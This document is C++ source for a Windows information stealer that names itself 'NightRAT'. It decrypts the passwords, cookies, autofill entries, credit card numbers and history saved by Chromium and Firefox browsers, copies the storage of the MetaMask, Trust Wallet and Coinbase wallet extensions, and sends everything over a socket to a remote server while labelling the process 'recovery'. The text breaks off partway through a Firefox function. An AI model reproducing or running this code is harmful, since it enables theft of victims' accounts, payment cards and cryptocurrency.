#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <vector>
#include <string>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include <memory>
#include <cstring>
#include <map>
#include <set>
#include <regex>
#include <cstdio>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <cctype>
#include <utility>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")

namespace fs = std::filesystem;
#include "includes/sqlite3.h"

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_RECOVERY_FILE = 0x07;

struct InterceptPoint {
    size_t address = 0;
    int reg_index = -1;
};

struct BrowserConfig {
    std::string name;
    std::string process_name;
    std::vector<std::wstring> exe_paths;
    std::string dll_name;
    std::vector<std::wstring> user_data_subdir;
    std::string output_dir;
    std::string temp_prefix;
    bool use_r14;
    bool use_roaming;
    bool has_abe;
    bool is_firefox;
};

struct WalletMetadata {
    std::string name;
    std::string chromium_id;
    std::string firefox_keyword;
};

static std::vector<WalletMetadata> target_wallets = {
    {"metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn", "metamask"},
    {"trustwallet", "egjidjbpglichdcondbcbdnbeeppgdph", "trust wallet"},
    {"coinbasewallet", "hnfanknocfeofbddgcijnmhnfnkdnaad", "coinbase wallet"}
};

// --- Helpers ---

std::string to_narrow_string(const wchar_t* w_str) {
    if (!w_str) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, NULL, 0, NULL, NULL);
    if (size <= 0) return "";
    std::string res(size, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w_str, -1, &res[0], size, NULL, NULL);
    if (!res.empty() && res.back() == '\0') res.pop_back();
    return res;
}

std::wstring utf8_to_wstring(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    if (size <= 0) return L"";
    std::wstring res(size, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &res[0], size);
    if (!res.empty() && res.back() == L'\0') res.pop_back();
    return res;
}

std::string json_escape(const std::string& s) {
    std::ostringstream oss;
    for (auto c : s) {
        switch (c) {
        case '"': oss << "\\\""; break;
        case '\\': oss << "\\\\"; break;
        case '\b': oss << "\\b"; break;
        case '\f': oss << "\\f"; break;
        case '\n': oss << "\\n"; break;
        case '\r': oss << "\\r"; break;
        case '\t': oss << "\\t"; break;
        default:
            if ('\x00' <= (unsigned char)c && (unsigned char)c <= '\x1f') {
                oss << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)(unsigned char)c;
            } else oss << c;
        }
    }
    return oss.str();
}

std::string format_timestamp(double ts) {
    if (ts <= 0) return "";
    time_t t = (time_t)ts; struct tm tm_buf;
#ifdef _WIN32
    gmtime_s(&tm_buf, &t);
#else
    gmtime_r(&t, &tm_buf);
#endif
    char buf[64]; strftime(buf, sizeof(buf), "%d-%m-%Y %H:%M:%S", &tm_buf);
    return std::string(buf);
}

std::string to_lower(std::string s) {
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return std::tolower(c); });
    return s;
}

// --- Socket Communication ---

static void send_with_mutex(SOCKET sock, const char* data, int len) {
    HANDLE hMutex = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, L"Global\\NightRAT_Socket_Mutex");
    if (hMutex) WaitForSingleObject(hMutex, INFINITE);
    int remaining = len; const char* p = data;
    while (remaining > 0) {
        int sent = send(sock, p, remaining, 0);
        if (sent <= 0) break;
        p += sent; remaining -= sent;
    }
    if (hMutex) { ReleaseMutex(hMutex); CloseHandle(hMutex); }
}

static void send_status(SOCKET sock, const std::string& msg) {
    if (sock == INVALID_SOCKET) return;
    std::string json_msg = "{\"action\":\"recovery_status\",\"message\":\"" + msg + "\"}\r\n";
    send_with_mutex(sock, json_msg.c_str(), (int)json_msg.size());
}

static void send_data_in_chunks(SOCKET sock, const std::string& relPath, const uint8_t* data, size_t data_size) {
    if (sock == INVALID_SOCKET) return;
    const size_t CHUNK_SIZE = 1024 * 1024;
    size_t total_sent = 0;
    do {
        size_t current_chunk = (data_size - total_sent > CHUNK_SIZE) ? CHUNK_SIZE : (data_size - total_sent);
        uint32_t pathLen = (uint32_t)relPath.size();
        uint32_t totalSize = sizeof(uint32_t) + pathLen + (uint32_t)current_chunk;
        std::vector<uint8_t> packet(sizeof(PacketHeader) + totalSize);
        PacketHeader* header = (PacketHeader*)packet.data();
        header->signature = PACKET_SIGNATURE; header->type = PACKET_TYPE_RECOVERY_FILE; header->size = totalSize;
        uint8_t* ptr = packet.data() + sizeof(PacketHeader);
        *(uint32_t*)ptr = pathLen; ptr += sizeof(uint32_t); memcpy(ptr, relPath.c_str(), pathLen); ptr += pathLen;
        if (current_chunk > 0) memcpy(ptr, data + total_sent, current_chunk);
        send_with_mutex(sock, (const char*)packet.data(), (int)packet.size());
        total_sent += current_chunk;
    } while (total_sent < data_size);
}

static void send_string_to_server(SOCKET sock, const std::string& relPath, const std::string& data) {
    if (data.empty()) return;
    send_data_in_chunks(sock, relPath, (const uint8_t*)data.data(), data.size());
}

static void send_file_from_disk(SOCKET sock, const fs::path& filePath, const std::string& relPath) {
    std::ifstream ifs(filePath, std::ios::binary);
    if (!ifs) return;
    const size_t CHUNK_SIZE = 1024 * 1024;
    std::vector<uint8_t> buffer(CHUNK_SIZE);
    while (ifs) {
        ifs.read((char*)buffer.data(), CHUNK_SIZE);
        std::streamsize bytes_read = ifs.gcount();
        if (bytes_read > 0) send_data_in_chunks(sock, relPath, buffer.data(), (size_t)bytes_read);
    }
}

void send_directory_recursively(SOCKET sock, const fs::path& source_dir, const std::string& server_path_prefix) {
    if (!fs::exists(source_dir)) return;
    std::error_code ec;
    for (const auto& entry : fs::recursive_directory_iterator(source_dir, ec)) {
        if (!ec && entry.is_regular_file()) {
            std::string rel = fs::relative(entry.path(), source_dir).string();
            std::replace(rel.begin(), rel.end(), '\\', '/');
            send_file_from_disk(sock, entry.path(), server_path_prefix + "/" + rel);
        }
    }
}

// --- Database Logic ---

std::string path_to_uri(const fs::path& p) {
    std::string path_str = to_narrow_string(p.wstring().c_str());
    std::string encoded = "";
    for (unsigned char c : path_str) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~' || c == '/' || c == ':') encoded += (char)c;
        else if (c == '\\') encoded += '/';
        else { char buf[4]; snprintf(buf, sizeof(buf), "%%%02X", c); encoded += buf; }
    }
    return "file:///" + encoded + "?mode=ro&nolock=1&immutable=1";
}

static sqlite3* copy_to_temp_and_open_db(const fs::path& db_path) {
    if (!fs::exists(db_path)) return nullptr;
    try {
        wchar_t temp_path[MAX_PATH], temp_file[MAX_PATH];
        if (GetTempPathW(MAX_PATH, temp_path) == 0) return nullptr;
        if (GetTempFileNameW(temp_path, L"rat", 0, temp_file) == 0) return nullptr;
        std::error_code ec; fs::copy_file(db_path, temp_file, fs::copy_options::overwrite_existing, ec);
        sqlite3* db = nullptr;
        if (sqlite3_open_v2(to_narrow_string(temp_file).c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) return db;
        if (db) sqlite3_close(db); fs::remove(temp_file, ec);
    } catch (...) {}
    return nullptr;
}

static void close_and_delete_db(sqlite3* db) {
    if (!db) return;
    const char* filename = sqlite3_db_filename(db, "main");
    std::string db_file = filename ? filename : "";
    sqlite3_close(db);
    if (!db_file.empty()) { std::error_code ec; fs::remove(utf8_to_wstring(db_file), ec); }
}

// --- Cryptography & Key Extraction ---

std::vector<uint8_t> base64_decode(const std::string& input) {
    DWORD out_len = 0;
    if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {
        std::vector<uint8_t> out(out_len);
        if (CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, out.data(), &out_len, NULL, NULL)) return out;
    }
    return {};
}

std::vector<uint8_t> decrypt_aes_gcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& nonce, const std::vector<uint8_t>& ciphertext) {
    BCRYPT_ALG_HANDLE h_alg = NULL; BCRYPT_KEY_HANDLE h_key = NULL; std::vector<uint8_t> plaintext;
    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, NULL, 0) == 0) {
        if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) == 0) {
            if (BCryptGenerateSymmetricKey(h_alg, &h_key, NULL, 0, (BYTE*)key.data(), (ULONG)key.size(), 0) == 0) {
                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info; BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
                if (ciphertext.size() > 16) {
                    std::vector<uint8_t> actual_ciphertext(ciphertext.begin(), ciphertext.end() - 16), tag(ciphertext.end() - 16, ciphertext.end());
                    auth_info.pbNonce = (BYTE*)nonce.data(); auth_info.cbNonce = (ULONG)nonce.size(); auth_info.pbTag = tag.data(); auth_info.cbTag = (ULONG)tag.size();
                    DWORD out_len = 0;
                    if (BCryptDecrypt(h_key, (BYTE*)actual_ciphertext.data(), (ULONG)actual_ciphertext.size(), &auth_info, NULL, 0, NULL, 0, &out_len, 0) == 0) {
                        plaintext.resize(out_len); if (BCryptDecrypt(h_key, (BYTE*)actual_ciphertext.data(), (ULONG)actual_ciphertext.size(), &auth_info, NULL, 0, plaintext.data(), (ULONG)plaintext.size(), &out_len, 0) != 0) plaintext.clear();
                    }
                }
            }
        }
    }
    if (h_key) BCryptDestroyKey(h_key); if (h_alg) BCryptCloseAlgorithmProvider(h_alg, 0); return plaintext;
}

bool is_mostly_printable(const std::vector<uint8_t>& data) {
    if (data.empty()) return true; size_t printable = 0;
    for (uint8_t b : data) if ((b >= 32 && b <= 126) || b == '\r' || b == '\n' || b == '\t') printable++;
    return (double)printable / data.size() > 0.8;
}

std::vector<uint8_t> decrypt_blob(const std::vector<uint8_t>& blob, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    if (blob.empty()) return {};
    if (blob.size() > 15 && (memcmp(blob.data(), "v10", 3) == 0 || memcmp(blob.data(), "v20", 3) == 0)) {
        std::vector<uint8_t> nonce(blob.begin() + 3, blob.begin() + 15), ciphertext(blob.begin() + 15, blob.end());
        auto try_decrypt = [&](const std::vector<uint8_t>& key) -> std::vector<uint8_t> {
            if (key.empty()) return {};
            std::vector<uint8_t> dec = decrypt_aes_gcm(key, nonce, ciphertext);
            if (!dec.empty()) {
                if (dec.size() > 32) {
                    std::vector<uint8_t> header(dec.begin(), dec.begin() + 32);
                    if (is_opera || !is_mostly_printable(header)) return std::vector<uint8_t>(dec.begin() + 32, dec.end());
                }
                return dec;
            }
            return {};
        };
        std::vector<uint8_t> res = try_decrypt(memcmp(blob.data(), "v20", 3) == 0 ? v20_key : v10_key);
        if (res.empty()) res = try_decrypt(v10_key);
        if (res.empty()) res = try_decrypt(v20_key);
        return res;
    } else if (blob.size() > 15) {
        DATA_BLOB input = { (DWORD)blob.size(), (BYTE*)blob.data() }, output = { 0, NULL };
        if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
            std::vector<uint8_t> dec(output.pbData, output.pbData + output.cbData); LocalFree(output.pbData); return dec;
        }
    }
    return {};
}

// --- Chromium Extraction Logic ---

void extract_passwords(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    std::vector<std::string> db_names = {"Login Data", "Login Data For Account", "Ya Passman Data"};
    sqlite3* db = nullptr;
    for (const auto& name : db_names) { db = copy_to_temp_and_open_db(profile_path / name); if (db) break; }
    if (!db) return;
    sqlite3_stmt* stmt; const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url = (const char*)sqlite3_column_text(stmt, 0), *user = (const char*)sqlite3_column_text(stmt, 1);
            const uint8_t* b_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 2); int b_size = sqlite3_column_bytes(stmt, 2);
            std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(b_ptr, b_ptr + b_size), v10_key, v20_key, is_opera);
            if (!dec.empty()) {
                std::string s_url = url ? url : "", s_user = user ? user : "", s_pass = std::string(dec.begin(), dec.end());
                txt << "URL: " << s_url << "\nUser: " << s_user << "\nPass: " << s_pass << "\n---\n";
                if (!first) jsn << ",\n";
                jsn << "    {\"url\": \"" << json_escape(s_url) << "\", \"username\": \"" << json_escape(s_user) << "\", \"password\": \"" << json_escape(s_pass) << "\"}";
                first = false;
            }
        }
        jsn << "\n]"; sqlite3_finalize(stmt); send_string_to_server(sock, out_prefix + "/passwords.txt", txt.str()); send_string_to_server(sock, out_prefix + "/passwords.json", jsn.str());
    }
    close_and_delete_db(db);
}

void extract_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera, const std::string& browser_name, const std::string& profile_name) {
    sqlite3* db = copy_to_temp_and_open_db(profile_path / "Network" / "Cookies"); if (!db) db = copy_to_temp_and_open_db(profile_path / "Cookies"); if (!db) return;
    sqlite3_stmt* stmt; const char* sql = "SELECT host_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, samesite FROM cookies";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* host = (const char*)sqlite3_column_text(stmt, 0), *name = (const char*)sqlite3_column_text(stmt, 1), *val = (const char*)sqlite3_column_text(stmt, 2);
            const uint8_t* b_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3); int b_size = sqlite3_column_bytes(stmt, 3); const char* path = (const char*)sqlite3_column_text(stmt, 4);
            long long exp_utc = sqlite3_column_int64(stmt, 5); int secure = sqlite3_column_int(stmt, 6), httponly = sqlite3_column_int(stmt, 7), samesite = sqlite3_column_int(stmt, 8);
            std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(b_ptr, b_ptr + b_size), v10_key, v20_key, is_opera);
            std::string c_val = !dec.empty() ? std::string(dec.begin(), dec.end()) : (val ? val : "");
            if (!c_val.empty()) {
                std::string s_name = name ? name : "", s_host = host ? host : "", s_path = path ? path : ""; double exp_date = (exp_utc > 0) ? ((double)(exp_utc - 11644473600000000ULL) / 1000000.0) : 0;
                txt << s_name << "=" << c_val << ";\n"; if (!first) jsn << ",\n"; bool hostOnly = (s_host.size() > 0 && s_host[0] != '.');
                jsn << "{\"Host raw\": \"" << (secure ? "https://" : "http://") << json_escape(s_host) << "/\", \"Name raw\": \"" << json_escape(s_name) << "\", \"Path raw\": \"" << json_escape(s_path) << "\", \"Content raw\": \"" << json_escape(c_val) << "\", \"Expires\": \"" << format_timestamp(exp_date) << "\", \"HTTP only raw\": \"" << (httponly ? "true" : "false") << "\", \"SameSite raw\": \"" << std::to_string(samesite) << "\", \"This domain only\": \"" << (hostOnly ? "true" : "false") << "\", \"Store raw\": \"" << to_lower(browser_name + "-" + profile_name) << "\"}";
                first = false;
            }
        }
        jsn << "\n]"; sqlite3_finalize(stmt); send_string_to_server(sock, out_prefix + "/cookies.txt", txt.str()); send_string_to_server(sock, out_prefix + "/cookies.json", jsn.str());
    }
    close_and_delete_db(db);
}

void extract_autofill(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, bool is_opera) {
    std::vector<std::string> db_names = {"Web Data", "Ya Autofill Data", "Ya Credit Cards"};
    std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
    for (const auto& db_name : db_names) {
        sqlite3* db = copy_to_temp_and_open_db(profile_path / db_name);
        if (db) {
            sqlite3_stmt* stmt; if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* n = (const char*)sqlite3_column_text(stmt, 0), *v = (const char*)sqlite3_column_text(stmt, 1);
                    std::string s_name = n?n:"", s_val = v?v:"";
                    txt << "Form: " << s_name << " = " << s_val << "\n"; if (!first) jsn << ",\n"; jsn << "{\"type\": \"form\", \"name\": \"" << json_escape(s_name) << "\", \"value\": \"" << json_escape(s_val) << "\"}"; first = false;
                }
                sqlite3_finalize(stmt);
            }
            if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    const char* name = (const char*)sqlite3_column_text(stmt, 0); int m = sqlite3_column_int(stmt, 1), y = sqlite3_column_int(stmt, 2);
                    const uint8_t* b_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3); int b_size = sqlite3_column_bytes(stmt, 3);
                    std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(b_ptr, b_ptr + b_size), v10_key, v20_key, is_opera);
                    if (!dec.empty()) {
                        std::string s_name = name ? name : "", s_num = std::string(dec.begin(), dec.end());
                        txt << "Card: " << s_name << " | Num: " << s_num << "\n"; if (!first) jsn << ",\n"; jsn << "{\"type\": \"card\", \"name\": \"" << json_escape(s_name) << "\", \"expiry\": \"" << std::to_string(m) << "/" << std::to_string(y) << "\", \"number\": \"" << json_escape(s_num) << "\"}"; first = false;
                    }
                }
                sqlite3_finalize(stmt);
            }
            close_and_delete_db(db);
        }
    }
    jsn << "\n]"; send_string_to_server(sock, out_prefix + "/autofill.txt", txt.str()); send_string_to_server(sock, out_prefix + "/autofill.json", jsn.str());
}

void extract_history(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
    sqlite3* db = copy_to_temp_and_open_db(profile_path / "History"); if (!db) return;
    sqlite3_stmt* stmt; const char* sql = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url = (const char*)sqlite3_column_text(stmt, 0), *title = (const char*)sqlite3_column_text(stmt, 1); int count = sqlite3_column_int(stmt, 2);
            std::string s_url = url ? url : "", s_title = title ? title : "";
            txt << "URL: " << s_url << " | Title: " << s_title << "\n"; if (!first) jsn << ",\n"; jsn << "{\"url\": \"" << json_escape(s_url) << "\", \"title\": \"" << json_escape(s_title) << "\", \"visit_count\": " << count << "}"; first = false;
        }
        jsn << "\n]"; sqlite3_finalize(stmt); send_string_to_server(sock, out_prefix + "/history.txt", txt.str()); send_string_to_server(sock, out_prefix + "/history.json", jsn.str());
    }
    close_and_delete_db(db);
}

void extract_chromium_wallets(SOCKET sock, const fs::path& profile_path, const std::string& browser_name, const std::string& profile_name) {
    std::string safe_b = to_lower(browser_name); std::replace(safe_b.begin(), safe_b.end(), ' ', '_');
    for (const auto& wallet : target_wallets) {
        if (wallet.chromium_id.empty()) continue;
        std::string prefix = "wallets/" + wallet.name + "_" + safe_b + "/" + profile_name;
        fs::path s_path = profile_path / "Local Extension Settings" / wallet.chromium_id; if (fs::exists(s_path)) send_directory_recursively(sock, s_path, prefix + "/Local Extension Settings");
        fs::path st_path = profile_path / "Extension State" / wallet.chromium_id; if (fs::exists(st_path)) send_directory_recursively(sock, st_path, prefix + "/Extension State");
        fs::path idb_path = profile_path / "IndexedDB" / ("chrome-extension_" + wallet.chromium_id + "_0.indexeddb.leveldb"); if (fs::exists(idb_path)) send_directory_recursively(sock, idb_path, prefix + "/IndexedDB");
    }
}

void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir) {
    std::vector<uint8_t> v10_key; bool is_dpapi; get_v10_key(user_data_dir, v10_key, is_dpapi);
    fs::path user_data(user_data_dir); bool is_opera = config.name.find("Opera") != std::string::npos || config.name.find("Yandex") != std::string::npos;
    auto process = [&](const fs::path& p) {
        if (fs::exists(p / "Preferences") || fs::exists(p / "Web Data") || fs::exists(p / "Login Data") || fs::exists(p / "Cookies") || fs::exists(p / "Network" / "Cookies")) {
            std::string p_name = p.filename().string(); if (p_name == "User Data" || p_name == "EBWebView") p_name = "RootProfile";
            std::string out = config.output_dir + "/" + p_name;
            extract_passwords(sock, p, out, v10_key, v20_key, is_opera); extract_cookies(sock, p, out, v10_key, v20_key, is_opera, config.name, p_name); extract_autofill(sock, p, out, v10_key, v20_key, is_opera); extract_history(sock, p, out); extract_chromium_wallets(sock, p, config.name, p_name);
        }
    };
    process(user_data); std::error_code ec; for (const auto& entry : fs::directory_iterator(user_data, ec)) if (!ec && entry.is_directory()) process(entry.path());
}

// --- Firefox Extraction Logic ---

void extract_firefox_cookies(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const std::string& browser_name, const std::string& profile_name) {
    sqlite3* db = copy_to_temp_and_open_db(profile_path / "cookies.sqlite"); if (!db) return;
    sqlite3_stmt* stmt; const char* sql = "SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* host = (const char*)sqlite3_column_text(stmt, 0), *name = (const char*)sqlite3_column_text(stmt, 1), *val = (const char*)sqlite3_column_text(stmt, 2);
            long long exp = sqlite3_column_int64(stmt, 4); int secure = sqlite3_column_int(stmt, 5);
            std::string s_host = host ? host : "", s_name = name ? name : "", s_val = val ? val : "";
            txt << s_name << "=" << s_val << ";\n"; if (!first) jsn << ",\n"; jsn << "{\"Host raw\": \"" << (secure ? "https://" : "http://") << json_escape(s_host) << "/\", \"Name raw\": \"" << json_escape(s_name) << "\", \"Content raw\": \"" << json_escape(s_val) << "\", \"Expires\": \"" << format_timestamp((double)exp) << "\", \"Store raw\": \"" << to_lower(browser_name + "-" + profile_name) << "\"}"; first = false;
        }
        jsn << "\n]"; sqlite3_finalize(stmt); send_string_to_server(sock, out_prefix + "/cookies.txt", txt.str()); send_string_to_server(sock, out_prefix + "/cookies.json", jsn.str());
    }
    close_and_delete_db(db);
}

void extract_firefox_history(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
    sqlite3* db = copy_to_temp_and_open_db(profile_path / "places.sqlite"); if (!db) return;
    sqlite3_stmt* stmt; const char* sql = "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url = (const char*)sqlite3_column_text(stmt, 0), *title = (const char*)sqlite3_column_text(stmt, 1); int count = sqlite3_column_int(stmt, 2);
            std::string s_url = url ? url : "", s_title = title ? title : "";
            txt << "URL: " << s_url << " | Title: " << s_title << "\n"; if (!first) jsn << ",\n"; jsn << "{\"url\": \"" << json_escape(s_url) << "\", \"title\": \"" << json_escape(s_title) << "\", \"visit_count\": " << count << "}"; first = false;
        }
        jsn << "\n]"; sqlite3_finalize(stmt); send_string_to_server(sock, out_prefix + "/history.txt", txt.str()); send_string_to_server(sock, out_prefix + "/history.json", jsn.str());
    }
    close_and_delete_db(db);
}

void extract_firefox_autofill(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix) {
    sqlite3* db = copy_to_temp_and_open_db(profile_path / "formhistory.sqlite"); if (!db) return;
    sqlite3_stmt* stmt; const char* sql = "SELECT fieldname, value FROM moz_formhistory";
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
        std::ostringstream txt, jsn; jsn << "[\n"; bool first = true;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* name = (const char*)sqlite3_column_text(stmt, 0), *val = (const char*)sqlite3_column_text(stmt, 1);
            std::string s_name = name ? name : "", s_val = val ? val : "";
            txt << "Field: " << s_name << " = " << s_val << "\n"; if (!first) jsn << ",\n"; jsn << "{\"name\": \"" << json_escape(s_name) << "\", \"value\": \"" << json_escape(s_val) << "\"}"; first = false;
        }
        jsn << "\n]"; sqlite3_finalize(stmt); send_string_to_server(sock, out_prefix + "/autofill.txt", txt.str()); send_string_to_server(sock, out_prefix + "/autofill.json", jsn.str());
    }
    close_and_delete_db(db);
}

typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
typedef struct SECItemStr { int type; unsigned char *data; unsigned int len; } SECItem;
typedef SECStatus (*PK11_AuthenticatePtr)(void *slot, int load_tokens, void *wincxt);
typedef void *(*PK11_GetInternalKeySlotPtr)();
typedef void (*PK11_FreeSlotPtr)(void *slot);
typedef SECStatus (*NSS_InitPtr)(const char *configdir);
typedef SECStatus (*NSS_ShutdownPtr)();
typedef SECStatus (*PK11SDR_DecryptPtr)(SECItem *data, SECItem *result, void *cx);
struct NSS_Functions { HMODULE h_nss; NSS_InitPtr NSS_Init; NSS_ShutdownPtr NSS_Shutdown; PK11_GetInternalKeySlotPtr PK11_GetInternalKeySlot; PK11_FreeSlotPtr PK11_FreeSlot; PK11_AuthenticatePtr PK11_Authenticate; PK11SDR_DecryptPtr PK11SDR_Decrypt; };

bool load_nss(const fs::path& nss_path, NSS_Functions& f) {
    SetDllDirectoryW(nss_path.wstring().c_str()); f.h_nss = LoadLibraryW((nss_path / "nss3.dll").wstring().c_str()); if (!f.h_nss) return false;
    f.NSS_Init = (NSS_InitPtr)GetProcAddress(f.h_nss, "NSS_Init"); f.NSS_Shutdown = (NSS_ShutdownPtr)GetProcAddress(f.h_nss, "NSS_Shutdown");
    f.PK11_GetInternalKeySlot = (PK11_GetInternalKeySlotPtr)GetProcAddress(f.h_nss, "PK11_GetInternalKeySlot"); f.PK11_FreeSlot = (PK11_FreeSlotPtr)GetProcAddress(f.h_nss, "PK11_FreeSlot");
    f.PK11_Authenticate = (PK11_AuthenticatePtr)GetProcAddress(f.h_nss, "PK11_Authenticate"); f.PK11SDR_Decrypt = (PK11SDR_DecryptPtr)GetProcAddress(f.h_nss, "PK11SDR_Decrypt");
    return f.NSS_Init && f.NSS_Shutdown && f.PK11_GetInternalKeySlot && f.PK11_FreeSlot && f.PK11_Authenticate && f.PK11SDR_Decrypt;
}

void extract_firefox_passwords(SOCKET sock, const fs::path& profile_path, const std::string& out_prefix, const fs::path& nss_dir) {
    NSS_Functions nss; if (!load_nss(nss_dir, nss)) return;
    if (nss.NSS_Init(profile_path.string().c_str()) == SECSuccess) {
        void* slot = nss.PK11_GetInternalKeySlot();
        if (slot) {
            if (nss.PK11_Authenticate(slot, TRUE, NULL) == SECSuccess) {
                fs::path lp = profile_path / "logins.json"; std::ifstream ifs(lp);
                if (ifs.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
                    std::ostringstream txt, jsn; jsn << "[\n"; bool first = true; size_t pos = 0;
                    while ((pos = content.find("\"hostname\":\"", pos)) != std::string::npos) {
                        pos += 12; size_t end = content.find("\"", pos); std::string host = content.substr(pos, end - pos);
                        pos = content.find("\"encryptedUsername\":\"", pos); pos += 21; end = content.find("\"", pos); std::string enc_user = content.substr(pos, end - pos);
                        pos = content.find("\"encryptedPassword\":\"", pos); pos += 21; end = content.find("\"", pos); std::string enc_pass = content.substr(pos, end - pos);
                        auto u_data = base64_decode(enc_user), p_data = base64_decode(enc_pass);
                        SECItem u_item = { 0, u_data.data(), (unsigned int)u_data.size() }, p_item = { 0, p_data.data(), (unsigned int)p_data.size() };
                        SECItem d_u = { 0, NULL, 0 }, d_p = { 0, NULL, 0 };
                        if (nss.PK11SDR_Decrypt(&u_item, &d_u, NULL) == SECSuccess && nss.PK11SDR_Decrypt(&p_item, &d_p, NULL) == SECSuccess) {
                            std::string s_u((char*)d_u.data, d_u.len), s_p((char*)d_p.data, d_p.len);
                            txt << "URL: " << host << "\nUser: " << s_u << "\nPass: " << s_p << "\n---\n";
                            if (!first) jsn << ",\n";
                            jsn << "{\"url\": \"" << json_escape(host) << "\", \"username\": \"" << json_escape(s_u) << "\", \"password\": \"" << json_escape(s_p) << "\"}";
                            first = false;
                        }
                        pos = end;
                    }
                    jsn << "\n]"; send_string_to_server(sock, out_prefix + "/passwords.txt", txt.str()); send_string_to_server(sock, out_prefix + "/passwords.json", jsn.str());
                }
            }
            nss.PK11_FreeSlot(slot);
        }
        nss.NSS_Shutdown();
    }
    FreeLibrary(nss.h_nss);
}

void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::wstring& user_data_dir) {
    fs::path ud(user_data_dir); fs::path nss_dir; std::vector<std::wstring> roots = get_search_roots();
